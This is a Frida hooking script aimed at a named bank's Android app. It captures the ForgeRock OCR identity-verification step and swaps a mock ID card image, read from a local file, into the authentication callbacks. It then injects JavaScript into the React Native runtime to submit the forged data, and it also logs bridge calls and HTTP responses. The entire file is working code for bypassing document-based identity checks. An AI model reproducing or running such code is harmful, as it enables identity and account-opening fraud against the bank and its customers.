// Sprint 2.61 — loadScriptFromFile (slim version, base64 from file)
// Reads base64 image from /data/local/tmp/mock_card_b64.txt at runtime

Java.perform(function () {
    console.log("[LSF] === loadScriptFromFile Approach (slim) ===");

    // Read base64 from file using BufferedReader
    var B64 = "";
    try {
        var BR = Java.use("java.io.BufferedReader");
        var FR = Java.use("java.io.FileReader");
        var reader = BR.$new(FR.$new("/data/local/tmp/mock_card_b64.txt"));
        B64 = reader.readLine();
        reader.close();
        console.log("[LSF] Base64 loaded: " + B64.length + " chars");
    } catch (e) {
        console.log("[LSF] Base64 load error: " + e);
        return;
    }

    var PromiseImpl = Java.use("com.facebook.react.bridge.PromiseImpl");
    var JSONObject = Java.use("org.json.JSONObject");

    var ocrResponseJson = null;
    var evaluated = false;

    // === HOOK: Capture OCR Response ===
    PromiseImpl.resolve.overload("java.lang.Object").implementation = function (value) {
        if (!ocrResponseJson && value !== null) {
            try {
                var str = value.toString();
                if (str.indexOf('"stage":"OCR"') >= 0 && str.length > 10000) {
                    ocrResponseJson = str;
                    console.log("[LSF] OCR Response captured: len=" + str.length);
                    console.log("[LSF] Waiting 45s for camera screen...");

                    setTimeout(function () {
                        Java.perform(function () {
                            if (evaluated || !ocrResponseJson) return;
                            evaluated = true;

                            console.log("\n[LSF] *** EXECUTING ***");

                            // Fill OCR callbacks
                            var json = JSONObject.$new(ocrResponseJson);
                            var callbacks = json.getJSONArray("callbacks");
                            for (var i = 0; i < callbacks.length(); i++) {
                                var cb = callbacks.getJSONObject(i);
                                var inputs = cb.getJSONArray("input");
                                for (var j = 0; j < inputs.length(); j++) {
                                    var input = inputs.getJSONObject(j);
                                    var name = input.getString("name");
                                    if (name === "IDToken1") input.put("value", 0);
                                    if (name === "IDToken2") input.put("value", B64);
                                }
                            }
                            var filledJson = json.toString();
                            console.log("[LSF] Filled callbacks. len=" + filledJson.length);

                            // Build JS code
                            var jsCode = "(function(){try{";
                            jsCode += "var d=" + filledJson + ";";
                            jsCode += "require('NativeModules').FRAuthBridge.next(JSON.stringify(d))";
                            jsCode += ".then(function(r){console.log('[LSF-JS] OK stage='+r.stage)})";
                            jsCode += ".catch(function(e){console.log('[LSF-JS] ERR:'+JSON.stringify(e).substring(0,200))})";
                            jsCode += ";}catch(e){console.log('[LSF-JS] EX:'+e)}})();";

                            // Write JS to app cache
                            var filePath = null;
                            try {
                                var AT = Java.use("android.app.ActivityThread");
                                var app = AT.currentApplication();
                                filePath = app.getCacheDir().getAbsolutePath() + "/ocr_inject.js";
                                var JString = Java.use("java.lang.String");
                                var FOS = Java.use("java.io.FileOutputStream");
                                var fos = FOS.$new(filePath);
                                fos.write(JString.$new(jsCode).getBytes());
                                fos.close();
                                console.log("[LSF] JS written: " + filePath);
                            } catch (e) { console.log("[LSF] Write error: " + e); return; }

                            // Get CatalystInstance and call loadScriptFromFile
                            Java.choose("com.facebook.react.runtime.BridgelessReactContext", {
                                onMatch: function (ctx) {
                                    try {
                                        var ci = ctx.getCatalystInstance();
                                        if (!ci) { console.log("[LSF] CI null"); return; }
                                        console.log("[LSF] CI: " + ci.$className);
                                        var BCI = Java.use("com.facebook.react.runtime.BridgelessCatalystInstance");
                                        var ciImpl = Java.cast(ci, BCI);
                                        try {
                                            ciImpl.loadScriptFromFile(filePath, "frida://ocr", false);
                                            console.log("[LSF] *** loadScriptFromFile CALLED ***");
                                        } catch (e) {
                                            console.log("[LSF] LSF error: " + e);
                                            // Try reflection
                                            try {
                                                var sCls = Java.use("java.lang.String").class;
                                                var bCls = Java.use("java.lang.Boolean").TYPE;
                                                var m = ci.getClass().getMethod("loadScriptFromFile", sCls, sCls, bCls);
                                                m.invoke(ci, filePath, "frida://ocr",
                                                    Java.use("java.lang.Boolean").valueOf(true));
                                                console.log("[LSF] *** loadScript via reflection ***");
                                            } catch(e2) { console.log("[LSF] reflection err: " + e2); }
                                        }
                                    } catch (e) { console.log("[LSF] CI error: " + e); }
                                },
                                onComplete: function () { console.log("[LSF] Done"); }
                            });
                        });
                    }, 45000);
                }
            } catch (e) {}
        }
        return this.resolve(value);
    };

    // bridge.next tracking
    try {
        var FRB = Java.use("com.bangkokbank.blue.ping.FRAuthBridge");
        var nc = 0;
        FRB.next.overload("java.lang.String", "com.facebook.react.bridge.Promise").implementation = function (j, p) {
            nc++;
            var s = "?"; try { var m = j.substring(0,5000).match(/"stage":"([^"]+)"/); if(m) s=m[1]; } catch(e){}
            console.log("[BN] #" + nc + " " + s + " " + j.length);
            return this.next(j, p);
        };
    } catch(e) {}

    // HTTP tracking
    try {
        Java.use("org.forgerock.android.auth.AuthServiceClient$2").onResponse.implementation = function (c, r) {
            try { var b = r.peekBody(2097152).string(); var m = b.match(/"stage":"([^"]+)"/);
                  console.log("[HTTP] " + r.code() + " " + (m?m[1]:"?")); } catch(e){}
            return this.onResponse(c, r);
        };
    } catch(e) {}

    console.log("[LSF] Ready. Waiting for OCR...");
});
